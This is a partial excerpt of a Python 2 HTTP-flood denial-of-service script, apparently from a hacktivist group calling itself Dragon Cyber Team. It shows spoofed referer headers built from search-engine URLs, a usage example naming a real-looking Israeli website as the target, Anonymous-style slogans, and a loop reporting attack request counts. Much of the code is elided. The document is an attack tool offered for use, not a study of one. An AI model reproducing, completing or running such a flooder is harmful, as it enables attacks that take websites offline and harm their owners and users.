...
def referer_list():
	...
	headers_referers.append('http://www.usatoday.com/search/results?q=')                       # Allahu Akbar                             #
	headers_referers.append('http://engadget.search.aol.com/search?q=')                        # Do Not grieve what                       #
	headers_referers.append('http://www.google.com/?q=')                                       # has passed , unless it makes             #
	headers_referers.append('http://www.usatoday.com/search/results?q=')                       # your work harder for  					  #
	headers_referers.append('http://engadget.search.aol.com/search?q=')                        # what is about to come - Umar Bin Khattab #
	headers_referers.append('http://www.bing.com/search?q=')                                   # Mister_D And Team   					  #				  
...
def usage():
	print 'DRAGON CYBER TEAM'
	print 'MISTER_D'
	print 'Usage: lulz.py (url)'
	print 'Example: lulz.py http://luthi.co.il/'
	print "\a"
print \
"""                                                       
                             ``;`                              
...
_________________________________________________________________
  ...
  #DRAGON CYBER TEAM# We Are Anonymous
  #MISTER_XDORKS     # We Are Legion
  #MISTER_D          # We Do Not Forgive
  #MISTER_LOOPS.ID   # We Do Not Forget
  ################## Expect Us
...
def httpcall(url):
	...
	try:
			...
			set_flag(1)
 			print '                                                                    '
 			print '#MISTER_D SEND ZOMBIE 65500 #'
 			print '#MISTER_XDORKS SEND ZOMBIE 55500 #'
 			print '#MISTER_LOOPS.ID SEND ZOMBIE 50000 #'
 			print '#DRAGON CYBER ARMY AND NICROBER CYBER TEAM SEND ZOMBIE 45000 #'
 			print '                                                                    '
			code=500
	...
	def run(self):
		...
		while flag==0:
			if (previous+150<request_counter) & (previous<>request_counter):
				print "#~~~>ATTACK THE WEBSITE: %d Sending more<~~~#" % (request_counter)
				previous=request_counter
		if flag==2:
			print "\n ~>STOP DLU COY :P<~"
...
if len(sys.argv) < 2:
	...
	if sys.argv[1]=="help":
		...
		print "ATTACK DLU COY :P"
		print "DRAGON CYBER ARMY"
		print "MISTER_D"
		if len(sys.argv)== 3:
			if sys.argv[2]=="safe":
				set_safe()
